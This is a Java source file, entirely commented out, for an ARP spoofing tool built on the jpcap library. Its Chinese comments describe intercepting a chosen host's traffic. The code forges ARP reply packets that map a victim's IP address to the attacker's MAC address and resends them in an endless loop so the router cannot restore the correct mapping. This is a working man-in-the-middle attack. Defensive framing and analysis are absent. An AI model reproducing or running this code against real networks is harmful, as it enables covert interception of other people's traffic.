//package com.sailing.arp;
//
//import jpcap.JpcapCaptor;
//import jpcap.JpcapSender;
//import jpcap.NetworkInterface;
//import jpcap.packet.ARPPacket;
//import jpcap.packet.EthernetPacket;
//
//import java.net.InetAddress;
//
///**
// * Created by duke on 2016/11/15.
// * arp-client
// * 对指定主机的拦截
// */
//public class ArpTest
//{
//
//
//    public static void main(String[] args) throws Exception {
//        sendArp(Constants.DE_IP,Constants.DE_MAC,Constants.SRC_IP,Constants.SRC_MAC,Constants.NET_WORK,Constants.TIME);
//    }
//    /**
//     *  为什么需要IP地址跟MAC地址呢?因为我们需要去对他进行ARP协议的欺骗。
//     * @param deip A主机地址（被欺骗的目标IP地址
//     * @param deMac A主机MAC地址（被欺骗的目标目标MAC数组
//     * @param srcIp 被替换Mac地址的IP地址
//     * @param srcMac 假的MAC数组,也就是我们用来捕捉数据包的主机MAC地址。
//     * @param network 发送arp的网卡，与被欺骗目标地址需要在同一网段
//     * @param time ARP重发间隔时间,不断发送防止被路由器地址替换
//     * @throws Exception
//     */
//    static void sendArp(String deip,String deMac,String srcIp,String srcMac,int network,int time) throws Exception {
//        InetAddress desip = InetAddress.getByName(deip);
//        byte[] desmac = stomac(deMac);
//        InetAddress srcip = InetAddress.getByName(srcIp);
//        byte[] srcmac = stomac(srcMac);
//        // 枚举网卡并打开设备
//        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
//        NetworkInterface device = devices[network];
//        JpcapSender sender = JpcapSender.openDevice(device);
//        // 设置ARP包
//        ARPPacket arp = new ARPPacket();
//        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
//        arp.prototype = ARPPacket.PROTOTYPE_IP;
//        arp.operation = ARPPacket.ARP_REPLY;
//        arp.hlen = 6;
//        arp.plen = 4;
//        arp.sender_hardaddr = srcmac;
//        arp.sender_protoaddr = srcip.getAddress();
//        arp.target_hardaddr = desmac;
//        arp.target_protoaddr = desip.getAddress();
//        // 设置DLC帧
//        EthernetPacket ether = new EthernetPacket();
//        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
//        ether.src_mac = srcmac;
//        ether.dst_mac = desmac;
//        arp.datalink = ether;
//        // 发送ARP应答包
//        while (true) {
//            System.out.println("send arp  >  "+deip);
//            sender.sendPacket(arp);
//            Thread.sleep(time * 1000);
//        }
//    }
//    static byte[] stomac(String s)
//    {
//        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
//        String[] s1 = s.split("-");
//        for (int x = 0; x < s1.length; x++)
//        {
//            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
//        }
//        return mac;
//    }
//}
